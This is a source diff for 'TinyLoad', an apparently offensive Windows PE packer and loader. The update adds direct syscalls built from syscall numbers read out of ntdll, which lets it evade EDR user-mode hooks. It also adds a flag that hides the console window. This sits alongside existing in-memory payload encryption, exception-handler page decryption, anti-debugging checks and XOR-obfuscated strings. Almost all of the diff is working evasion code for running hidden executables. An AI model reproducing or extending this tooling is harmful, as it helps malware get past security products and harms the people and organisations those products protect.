@@ -1,4 +1,4 @@
-// Tinyload v7.1, MIT license, https://github.com/iamsopotatoe-coder/TinyLoad/
+// Tinyload v7.2, MIT license, https://github.com/iamsopotatoe-coder/TinyLoad/
 #include <windows.h>
 #include <vector>
 #include <string>
@@ -83,6 +83,94 @@ __attribute__((noinline)) __attribute__((used)) static void noiseDecrypt() {
     sdec2((char*)junk, g_noise[idx].enc, g_noise[idx].n, g_noise[idx].k);
 }
 
+// direct syscalls - SSNs from disk ntdll
+#ifndef THREAD_ALL_ACCESS
+#define THREAD_ALL_ACCESS 0x1FFFFF
+#endif
+
+static BYTE* g_ss = nullptr;
+#define SS_SZ 12
+enum { SS_AllocVM, SS_ProtectVM, SS_WaitObj, SS_CreateTh, SS_Delay, SS_Close, SS_QueryInfo, SS_COUNT };
+
+static DWORD ssnGet(const char* name) {
+    HANDLE f = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (f == INVALID_HANDLE_VALUE) return 0;
+    DWORD sz = GetFileSize(f, NULL);
+    HANDLE m = CreateFileMappingA(f, NULL, PAGE_READONLY, 0, 0, NULL);
+    CloseHandle(f);
+    if (!m) return 0;
+    BYTE* buf = (BYTE*)MapViewOfFile(m, FILE_MAP_READ, 0, 0, 0);
+    CloseHandle(m);
+    if (!buf) return 0;
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(buf + ((IMAGE_DOS_HEADER*)buf)->e_lfanew);
+    auto* ed = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(buf + ed->VirtualAddress);
+    DWORD* names = (DWORD*)(buf + exp->AddressOfNames);
+    WORD*  ords  = (WORD*)(buf + exp->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)(buf + exp->AddressOfFunctions);
+    DWORD r = 0;
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        if (!strcmp((char*)(buf + names[i]), name)) {
+            DWORD rva = funcs[ords[i]];
+            if (rva >= ed->VirtualAddress && rva < ed->VirtualAddress + ed->Size) break;
+            r = *(DWORD*)(buf + rva + 4);
+            break;
+        }
+    }
+    UnmapViewOfFile(buf);
+    return r;
+}
+
+__attribute__((noinline)) static void sysInit() {
+    g_ss = (BYTE*)VirtualAlloc(NULL, SS_COUNT * SS_SZ, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!g_ss) return;
+    const char* tbl[SS_COUNT] = {"NtAllocateVirtualMemory","NtProtectVirtualMemory","NtWaitForSingleObject",
+        "NtCreateThreadEx","NtDelayExecution","NtClose","NtQueryInformationProcess"};
+    for (int i = 0; i < SS_COUNT; i++) {
+        BYTE* s = g_ss + i * SS_SZ;
+        s[0]=0x4C; s[1]=0x8B; s[2]=0xD1; s[3]=0xB8;
+        *(DWORD*)(s+4) = ssnGet(tbl[i]);
+        s[8]=0x0F; s[9]=0x05; s[10]=0xC3; s[11]=0x90;
+    }
+    DWORD old;
+    VirtualProtect(g_ss, SS_COUNT * SS_SZ, PAGE_EXECUTE_READ, &old);
+}
+
+// typed wrappers
+typedef NTSTATUS(NTAPI* pNtAlloc)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
+typedef NTSTATUS(NTAPI* pNtProt)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
+typedef NTSTATUS(NTAPI* pNtWait)(HANDLE,BOOLEAN,PLARGE_INTEGER);
+typedef NTSTATUS(NTAPI* pNtCreate)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,ULONG_PTR,SIZE_T,SIZE_T,PVOID);
+typedef NTSTATUS(NTAPI* pNtDelay)(BOOLEAN,PLARGE_INTEGER);
+typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);
+typedef NTSTATUS(NTAPI* pNtQuery)(HANDLE,DWORD,PVOID,ULONG,PULONG);
+
+static pNtAlloc  _NtAllocVM;
+static pNtProt   _NtProtectVM;
+static pNtWait   _NtWaitObj;
+static pNtCreate _NtCreateTh;
+static pNtDelay  _NtDelayExec;
+static pNtClose  _NtClose;
+static pNtQuery  _NtQueryInfo;
+
+static void sysBind() {
+    _NtAllocVM   = (pNtAlloc)&g_ss[SS_AllocVM*SS_SZ];
+    _NtProtectVM = (pNtProt)&g_ss[SS_ProtectVM*SS_SZ];
+    _NtWaitObj   = (pNtWait)&g_ss[SS_WaitObj*SS_SZ];
+    _NtCreateTh  = (pNtCreate)&g_ss[SS_CreateTh*SS_SZ];
+    _NtDelayExec = (pNtDelay)&g_ss[SS_Delay*SS_SZ];
+    _NtClose     = (pNtClose)&g_ss[SS_Close*SS_SZ];
+    _NtQueryInfo = (pNtQuery)&g_ss[SS_QueryInfo*SS_SZ];
+}
+
+#define NtAllocVM  (*_NtAllocVM)
+#define NtProtVM   (*_NtProtectVM)
+#define NtWaitObj  (*_NtWaitObj)
+#define NtCreateTh (*_NtCreateTh)
+#define NtDelay    (*_NtDelayExec)
+#define NtClose    (*_NtClose)
+#define NtQuery    (*_NtQueryInfo)
+
 //dual thread key recombination
 struct PxTR_Context {
     DWORD k[4];          // [0,1] from Thread A, [2,3] from Thread B
@@ -144,18 +232,17 @@ static DWORD WINAPI PxTR_ThreadA(LPVOID p) {
     // decode Thread A's key halves
     DWORD k0 = _pxRead(0) ^ 0xFEEDF00D;
     DWORD k1 = _pxRead(1) ^ 0xCAFEBABE;
-    WaitForSingleObject(ctx->fenceEvent, INFINITE);
+    NtWaitObj(ctx->fenceEvent, FALSE, NULL);
     // recombine transiently
     ctx->k[0] = k0; ctx->k[1] = k1;
     // fall back to XOR for short/remainder
     SIZE_T nWords = ctx->length / 4;
     if (nWords >= 2) {
         xxteaDecrypt(ctx, (DWORD*)ctx->target, (int)nWords);
-    } else if (ctx->length > 0) {
-        DWORD tailKey = k0 ^ k1 ^ ctx->k[2] ^ ctx->k[3];
-        for (size_t i = 0; i < ctx->length; i++)
-            ctx->target[i] ^= (BYTE)(tailKey >> ((i & 3) * 8));
     }
+    DWORD tailKey = k0 ^ k1 ^ ctx->k[2] ^ ctx->k[3];
+    for (size_t i = nWords * 4; i < ctx->length; i++)
+        ctx->target[i] ^= (BYTE)(tailKey >> ((i & 3) * 8));
     // scramble all key material
     _pxBlock.k0 = 0; _pxBlock.k1 = 0;
     ctx->k[0] = 0; ctx->k[1] = 0; ctx->k[2] = 0; ctx->k[3] = 0;
@@ -1072,7 +1159,9 @@ static int sp_hdr() {
     return 1;
 }
 static int sp_map() {
-    g_pe.base = VirtualAlloc(NULL, g_pe.nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    { PVOID b=NULL; SIZE_T sz=g_pe.nt->OptionalHeader.SizeOfImage;
+      NtAllocVM((HANDLE)-1, &b, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+      g_pe.base = b; }
     if (!g_pe.base) return -2;
     size_t hdrSize = g_pe.nt->OptionalHeader.SizeOfHeaders;
     if (hdrSize > g_pe.data->size()) {
@@ -1234,7 +1323,7 @@ static void vehPageXor(BYTE* p, size_t sz, uint64_t k, uintptr_t addr) {
 
 static DWORD WINAPI vehWatchdogProc(LPVOID) {
     while (!g_vehStop) {
-        Sleep(50);
+        { LARGE_INTEGER d; d.QuadPart = -500000; NtDelay(FALSE, &d); }
         EnterCriticalSection(&g_vehLock);
         DWORD now = GetTickCount();
         for (int i = 0; i < g_vehCacheCnt; ) {
@@ -1242,10 +1331,10 @@ static DWORD WINAPI vehWatchdogProc(LPVOID) {
                 uintptr_t pg = g_vehCache[i].addr;
                 DWORD old;
                 // fence: stop all access, any faulting thread blocks in VEH on our CS
-                VirtualProtect((LPVOID)pg, 0x1000, PAGE_NOACCESS, &old);
-                VirtualProtect((LPVOID)pg, 0x1000, PAGE_READWRITE, &old);
+                { PVOID b=(PVOID)pg; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_NOACCESS,&old); }
+                { PVOID b=(PVOID)pg; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_READWRITE,&old); }
                 vehPageXor((BYTE*)pg, 0x1000, g_vehKey, pg);
-                VirtualProtect((LPVOID)pg, 0x1000, PAGE_NOACCESS, &old);
+                { PVOID b=(PVOID)pg; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_NOACCESS,&old); }
                 g_vehCache[i] = g_vehCache[--g_vehCacheCnt];
             } else { i++; }
         }
@@ -1273,9 +1362,9 @@ __attribute__((used)) static LONG CALLBACK vehHandler(EXCEPTION_POINTERS* ex) {
         }
     }
     DWORD old;
-    VirtualProtect((LPVOID)pg, 0x1000, PAGE_READWRITE, &old);
+    { PVOID b=(PVOID)pg; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_READWRITE,&old); }
     vehPageXor((BYTE*)pg, 0x1000, g_vehKey, pg);
-    VirtualProtect((LPVOID)pg, 0x1000, lookupOrigProt(pg), &old);
+    { PVOID b=(PVOID)pg; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,lookupOrigProt(pg),&old); }
     if (g_vehCacheCnt < 256) {
         g_vehCache[g_vehCacheCnt].addr = pg;
         g_vehCache[g_vehCacheCnt].lastTick = GetTickCount();
@@ -1290,10 +1379,10 @@ __attribute__((used)) static LONG CALLBACK vehHandler(EXCEPTION_POINTERS* ex) {
         }
         uintptr_t evict = g_vehCache[oldest].addr;
         // fence: stop all access, VEH blocked on our CS
-        VirtualProtect((LPVOID)evict, 0x1000, PAGE_NOACCESS, &old);
-        VirtualProtect((LPVOID)evict, 0x1000, PAGE_READWRITE, &old);
+        { PVOID b=(PVOID)evict; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_NOACCESS,&old); }
+        { PVOID b=(PVOID)evict; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_READWRITE,&old); }
         vehPageXor((BYTE*)evict, 0x1000, g_vehKey, evict);
-        VirtualProtect((LPVOID)evict, 0x1000, PAGE_NOACCESS, &old);
+        { PVOID b=(PVOID)evict; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_NOACCESS,&old); }
         g_vehCache[oldest].addr = pg;
         g_vehCache[oldest].lastTick = GetTickCount();
     }
@@ -1303,7 +1392,7 @@ __attribute__((used)) static LONG CALLBACK vehHandler(EXCEPTION_POINTERS* ex) {
 
 static void vehCleanup() {
     g_vehStop = 1;
-    if (g_vehWatchdog) { WaitForSingleObject(g_vehWatchdog, 2000); CloseHandle(g_vehWatchdog); g_vehWatchdog = NULL; }
+    if (g_vehWatchdog) { LARGE_INTEGER t; t.QuadPart = -20000000; NtWaitObj(g_vehWatchdog,FALSE,&t); NtClose(g_vehWatchdog); g_vehWatchdog = NULL; }
     RemoveVectoredExceptionHandler(g_vehHandle);
     DeleteCriticalSection(&g_vehLock);
 }
@@ -1345,14 +1434,14 @@ static int sp_veh() {
             if (off < hdrEnd) continue; // skip header overlap
             BYTE* p = (BYTE*)g_pe.base + off;
             DWORD old;
-            VirtualProtect(p, 0x1000, PAGE_READWRITE, &old);
+            { PVOID b=p; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_READWRITE,&old); }
             vehPageXor(p, 0x1000, g_vehKey, (uintptr_t)p);
-            VirtualProtect(p, 0x1000, PAGE_NOACCESS, &old);
+            { PVOID b=p; SIZE_T sz=0x1000; NtProtVM((HANDLE)-1,&b,&sz,PAGE_NOACCESS,&old); }
         }
     }
     g_vehHandle = AddVectoredExceptionHandler(1, vehHandler);
     g_vehStop = 0;
-    g_vehWatchdog = CreateThread(NULL, 0, vehWatchdogProc, NULL, 0, NULL);
+    { HANDLE th=NULL; NtCreateTh(&th,THREAD_ALL_ACCESS,NULL,(HANDLE)-1,(PVOID)vehWatchdogProc,NULL,0,0,0,0,NULL); g_vehWatchdog=th; }
     return 5;
 }
 
@@ -1388,9 +1477,10 @@ static struct {
 
 static int s_chk() {
     initStrings();
+    if (!g_ss) { sysInit(); sysBind(); }
     if (isDebugged()) return -2;
     noiseDecrypt();
-    // TODO: direct syscall for NtQueryInformationProcess to bypass IAT hooks
+    { ULONG dbg = 0; NtQuery((HANDLE)-1, 0x1F, &dbg, sizeof(dbg), NULL); if (!dbg) return -2; }
     GetModuleFileNameA(NULL, g_st.self, MAX_PATH);
     return 1;
 }
@@ -1462,15 +1552,16 @@ static int s_prs() {
             pxCtx.length = overlayLen;
             pxCtx.fenceEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
             if (pxCtx.fenceEvent) {
-                HANDLE hA = CreateThread(NULL, 0, PxTR_ThreadA, &pxCtx, 0, NULL);
-                HANDLE hB = CreateThread(NULL, 0, PxTR_ThreadB, &pxCtx, 0, NULL);
+                HANDLE hA=NULL, hB=NULL;
+                NtCreateTh(&hA,THREAD_ALL_ACCESS,NULL,(HANDLE)-1,(PVOID)PxTR_ThreadA,&pxCtx,0,0,0,0,NULL);
+                NtCreateTh(&hB,THREAD_ALL_ACCESS,NULL,(HANDLE)-1,(PVOID)PxTR_ThreadB,&pxCtx,0,0,0,0,NULL);
                 if (hA && hB) {
-                    WaitForSingleObject(hA, INFINITE);
-                    WaitForSingleObject(hB, INFINITE);
+                    NtWaitObj(hA,FALSE,NULL);
+                    NtWaitObj(hB,FALSE,NULL);
                 }
-                if (hA) CloseHandle(hA);
-                if (hB) CloseHandle(hB);
-                CloseHandle(pxCtx.fenceEvent);
+                if (hA) NtClose(hA);
+                if (hB) NtClose(hB);
+                NtClose(pxCtx.fenceEvent);
             }
         }
         // read chunks from file
@@ -1603,7 +1694,7 @@ void scrambleSections(Bytes& data) {
     }
 }
 
-bool pack(const std::string& in, const std::string& out, bool vm, bool comp, bool veh) {
+bool pack(const std::string& in, const std::string& out, bool vm, bool comp, bool veh, bool noconsole) {
     Bytes orig = loadFile(in);
     if (orig.size() < 2 || orig[0] != 'M' || orig[1] != 'Z') { printf("error: '%s' is not a valid PE file\n", in.c_str()); return false; }
     printf("input: %zu bytes\n", orig.size());
@@ -1723,7 +1814,7 @@ bool pack(const std::string& in, const std::string& out, bool vm, bool comp, boo
 
         vmCode = makeVmProgram(opmap_enc, key1, key2, canOff, canExp, canCnt);
         vmEncryptPayload(pay, key1, key2);
-        printf("vm encrypted: custom ISA, %zu bytes of bytecode\n", vmCode.size());
+        printf("vm encrypted: %zu bytes of bytecode\n", vmCode.size());
     }
 
     if (veh) {
@@ -1902,6 +1993,11 @@ bool pack(const std::string& in, const std::string& out, bool vm, bool comp, boo
     result.push_back((encTailOff >> 16) & 0xFF);
     result.push_back((encTailOff >> 24) & 0xFF);
 
+    if (noconsole) {
+        IMAGE_DOS_HEADER* hdr = (IMAGE_DOS_HEADER*)result.data();
+        IMAGE_NT_HEADERS64* nth = (IMAGE_NT_HEADERS64*)(result.data() + hdr->e_lfanew);
+        nth->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
+    }
     scrambleSections(result);
 
     if (!saveFile(out, result)) return false;
@@ -1912,7 +2008,7 @@ bool pack(const std::string& in, const std::string& out, bool vm, bool comp, boo
 int main(int argc, char* argv[]) {
     if (tryRun()) return 0;
     std::string in, out;
-    bool vm = false, comp = false, veh = false;
+    bool vm = false, comp = false, veh = false, noconsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
         if (a == "--i" && i + 1 < argc) { in = argv[++i]; if (in.size() < 4 || _stricmp(in.c_str() + in.size() - 4, ".exe")) in += ".exe"; }
@@ -1920,28 +2016,31 @@ int main(int argc, char* argv[]) {
         else if (a == "--vm") vm = true;
         else if (a == "--c") comp = true;
         else if (a == "--veh") veh = true;
+        else if (a == "--noconsole") noconsole = true;
     }
     if (in.empty()) {
-        // help strings XOR'ed 
+        // help strings XOR'ed
         static const BYTE _eh[] = {
-            0x09,0x37,0x31,0x19,0x2D,0x0D,0x02,0x00,0x45,0x10,0x50,0x46,0x59,0x4A,0x46,0x4C,
+            0x09,0x37,0x31,0x19,0x2D,0x0D,0x02,0x00,0x45,0x10,0x50,0x46,0x5B,0x4A,0x46,0x4C,
             0x3D,0x2B,0x4F,0x00,0x10,0x11,0x18,0x11,0x07,0x59,0x14,0x0A,0x00,0x0A,0x0F,0x19,
-            0x0F,0x73,0x75,0xF5,0xF2,0xE3,0xE4,0xE1,0xBF,0xA6,0xD3,0xE1,0xE7,0xF3,0xC7,0xE3,
-            0xEC,0xEA,0xA1,0xF5,0xE9,0xF7,0xB3,0xB9,0xB8,0xFF,0xB7,0xA4,0xFF,0xF3,0xF7,0xF9,
-            0xA3,0xBE,0xC4,0xCF,0xD1,0xD6,0xCA,0xCB,0xCB,0xD5,0xFA,0xA5,0xA3,0x8A,0x8B,0x81,
-            0x80,0xC7,0x8F,0x8C,0xD7,0xDB,0xDF,0xD1,0x8B,0x96,0x97,0x98,0x99,0xD3,0xD5,0xCC,
-            0xC8,0xCA,0x9F,0xA5,0xB9,0xA7,0xE3,0xB0,0xAA,0xE6,0xB7,0xA9,0xAA,0xA1,0xC6,0xC6,
-            0xED,0xEE,0xE2,0xFD,0xBE,0xF2,0xEF,0xB2,0xBC,0xBA,0xB2,0xE6,0xF9,0xFA,0xFB,0xFC,
-            0xB2,0xAB,0xAB,0x90,0x94,0x96,0xC3,0x94,0x84,0x92,0x8F,0xC8,0xC1,0x8E,0x8E,0x8A,
-            0x8C,0x9B,0x83,0x84,0xCB,0xD2,0x9A,0x9A,0x85,0x83,0x83,0xA7,0x89,0x9B,0x98,0x97,
-            0x98,0x9A,0xD1,0x65,0x79,0x67,0x2A,0x09,0x0F,0x26,0x27,0x25,0x24,0x7C,0x66,0x2C,
-            0x2D,0x2E,0x2F,0x30,0x31,0x32,0x33,0x34,0x35,0x40,0x5A,0x38,0x7C,0x74,0x78,0x6E,
-            0x64,0x6E,0x6B,0x49,0x4E,0x4C,0x2E,0x2E,0x05,0x06,0x0A,0x05,0x4A,0x0A,0x0B,0x0C,
-            0x0D,0x0E,0x0F,0x10,0x11,0x12,0x13,0x14,0x79,0x6C,0x00,0x0F,0x19,0x59,0x54,0x51,
-            0x4D,0x4C,0x5A,0x33,0x32,0x2B,0x2C,0x2A,0x48,0x4C,0x67,0x68,0x64,0x67,0x3D,0x29,
-            0x25,0x6E,0x6F,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x01,0x1D,0x11,0x7A,0x2B,0x3D,
-            0x3A,0x3B,0x72,0x06,0x00,0x17,0x0F,0x10,0x45,0x02,0x02,0x0B,0x1B,0x13,0x1B,0x18,
-            0x04,0x01,0x01,0x7D,0x7B
+            0x0F,0x74,0x0A,0xF3,0xE0,0xE5,0xE6,0xBE,0xA5,0xD2,0xEE,0xE6,0xF0,0xC6,0xE4,0xED,
+            0xE9,0xA0,0xEA,0xE8,0xF4,0xB2,0xBE,0xB9,0xFC,0xB6,0xAB,0xFE,0xF0,0xF6,0xFE,0xA2,
+            0xBD,0xC5,0xF0,0xD0,0xD5,0xCB,0xCC,0xCA,0xD6,0xFB,0xAD,0x88,0x89,0x87,0x86,0xC5,
+            0x8D,0x92,0xC9,0xD9,0xDD,0xD7,0x8D,0x94,0x95,0x96,0x97,0xD1,0xD7,0xCA,0xCE,0xC8,
+            0x9D,0xDB,0xC7,0xA5,0xE1,0xB6,0xAC,0xE4,0xB5,0xA7,0xA4,0xA3,0xC3,0xEA,0xEB,0xE1,
+            0xE0,0xA1,0xEF,0xEC,0xB7,0xBB,0xBF,0xB1,0xEB,0xF6,0xF7,0xF8,0xF9,0xB5,0xAE,0xA8,
+            0xAD,0xAB,0xAB,0xC0,0x91,0x83,0x97,0x8C,0xC5,0xCE,0x83,0x8D,0x8F,0x8B,0x9E,0x80,
+            0x99,0xD4,0xCF,0x99,0x9F,0x82,0x86,0x80,0xAA,0x86,0x96,0x9B,0x92,0x9F,0x9F,0xD2,
+            0x98,0x86,0x9A,0x29,0x0B,0x22,0x23,0x29,0x28,0x70,0x6A,0x28,0x29,0x2A,0x2B,0x2C,
+            0x2D,0x2E,0x2F,0x30,0x31,0x44,0x5E,0x34,0x70,0x78,0x74,0x6A,0x60,0x6A,0x6F,0x75,
+            0x72,0x70,0x15,0x00,0x01,0x0F,0x0E,0x47,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,
+            0x0D,0x0E,0x0F,0x7C,0x6B,0x05,0x04,0x14,0x56,0x59,0x5A,0x48,0x4B,0x5F,0x48,0x4F,
+            0x54,0x51,0x51,0x4A,0x61,0x62,0x6E,0x69,0x33,0x23,0x2F,0x68,0x69,0x6A,0x6B,0x6C,
+            0x6D,0x6E,0x6F,0x70,0x07,0x17,0x1B,0x74,0x25,0x37,0x30,0x3D,0x74,0x3C,0x3A,0x29,
+            0x31,0x2A,0x7F,0x04,0x04,0x01,0x11,0x1D,0x15,0x12,0x0E,0x07,0x07,0x60,0x4B,0x4C,
+            0x40,0x43,0x01,0x1F,0x12,0x1D,0x1D,0x07,0x1A,0x1A,0x12,0x58,0x59,0x5A,0x3C,0x29,
+            0x34,0x5E,0x0C,0xF5,0xE3,0xF1,0xFA,0xF7,0xF1,0xE3,0xEA,0xA8,0xA1,0xE4,0xE4,0xAC,
+            0xEE,0xE1,0xE1,0xE3,0xFE,0xFE,0xF6,0xB4,0xE2,0xFF,0xF9,0xFC,0xF6,0xED,0xB2
         };
         char buf[512]; uint8_t k = 0x5D;
         for (int i = 0; i < (int)sizeof(_eh); i++) {
@@ -1955,7 +2054,7 @@ int main(int argc, char* argv[]) {
         auto d = in.rfind('.');
         out = d != std::string::npos ? in.substr(0, d) + "_packed" + in.substr(d) : in + "_packed.exe";
     }
-    if (!vm && !comp && !veh) {
+    if (!vm && !comp && !veh && !noconsole) {
         static const BYTE _en[] = {
             0x48,0x21,0x33,0x2C,0x2A,0x2A,0x22,0x7C,0x67,0x26,0x26,0x6A,0x2D,0x20,0x2C,0x29,
             0x3C,0x70,0x22,0x22,0x36,0x37,0x3C,0x30,0x3E,0x3D,0x3D,0x57,0x51
@@ -1968,5 +2067,5 @@ int main(int argc, char* argv[]) {
         puts(b2);
         return 1;
     }
-    return pack(in, out, vm, comp, veh) ? 0 : 1;
+    return pack(in, out, vm, comp, veh, noconsole) ? 0 : 1;
 }
